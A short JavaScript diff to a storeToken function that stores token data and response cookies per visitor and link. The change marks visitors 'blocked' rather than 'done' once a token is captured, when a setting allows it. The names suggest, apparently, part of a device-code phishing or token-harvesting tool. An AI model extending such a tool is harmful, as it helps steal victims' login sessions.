@@ -365,13 +365,19 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
     const tokenId = result.insertId;
 
-    // Update visitor status to "done"
+    // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
     try {
+      const [blockRows] = await db.query(
+        'SELECT block_done_visitors FROM visitor_settings WHERE user_id = ?',
+        [job.user_id]
+      );
+      const blockDone = blockRows.length > 0 && blockRows[0].block_done_visitors == 1;
+      const newStatus = blockDone ? 'blocked' : 'done';
       await db.query(
         'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
-        ['done', job.user_id, job.link_id, 'waiting']
+        [newStatus, job.user_id, job.link_id, 'waiting']
       );
-      console.log(`[DeviceProxy] Visitor marked as done for user ${job.user_id}, link ${job.link_id}`);
+      console.log(`[DeviceProxy] Visitor marked as ${newStatus} for user ${job.user_id}, link ${job.link_id}`);
     } catch (updateErr) {
       console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
     }
